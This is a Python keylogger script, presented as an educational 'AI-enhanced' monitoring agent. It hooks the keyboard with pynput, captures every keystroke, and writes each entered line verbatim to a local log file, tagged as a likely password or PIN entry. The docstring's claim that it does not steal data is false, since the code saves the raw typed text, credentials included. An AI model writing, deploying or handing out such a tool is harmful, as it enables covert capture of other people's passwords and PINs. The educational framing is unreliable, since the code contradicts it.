"""
AI-Enhanced Keystroke Logging Agent
Educational & Cybersecurity Awareness Purpose Only

This agent demonstrates how keystroke patterns can be
analyzed to infer sensitive user activity WITHOUT stealing data.
"""

from pynput import keyboard
import time
import string

LOG_FILE = "keylog_ai.txt"
buffer = ""
last_time = time.time()

# -------------------------------
# Simple AI / Rule-Based Analyzer
# -------------------------------
def analyze_pattern(text, duration):
    digits = sum(c.isdigit() for c in text)
    symbols = sum(c in string.punctuation for c in text)
    letters = sum(c.isalpha() for c in text)

    if digits >= 4 and letters == 0:
        return "POSSIBLE PIN ENTRY"

    if letters >= 4 and symbols >= 1 and digits >= 1:
        return "POSSIBLE PASSWORD ENTRY"

    if len(text) > 20 and duration < 5:
        return "RAPID TYPING ACTIVITY"

    return "NORMAL INPUT"


# -------------------------------
# Key Capture Callback
# -------------------------------
def on_press(key):
    global buffer, last_time

    try:
        buffer += key.char
    except AttributeError:
        if key == keyboard.Key.space:
            buffer += " "
        elif key == keyboard.Key.enter:
            now = time.time()
            duration = round(now - last_time, 2)

            classification = analyze_pattern(buffer.strip(), duration)

            with open(LOG_FILE, "a") as f:
                f.write(
                    f"[{time.ctime()}] "
                    f"[{classification}] "
                    f"[Duration: {duration}s] "
                    f"Input: {buffer.strip()}\n"
                )

            buffer = ""
            last_time = now


# -------------------------------
# Agent Startup
# -------------------------------
print("====================================")
print(" AI Keystroke Monitoring Agent STARTED")
print(" Mode: Educational / Awareness")
print(" Logging: Local Only")
print(" Press CTRL + C to stop")
print("====================================")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
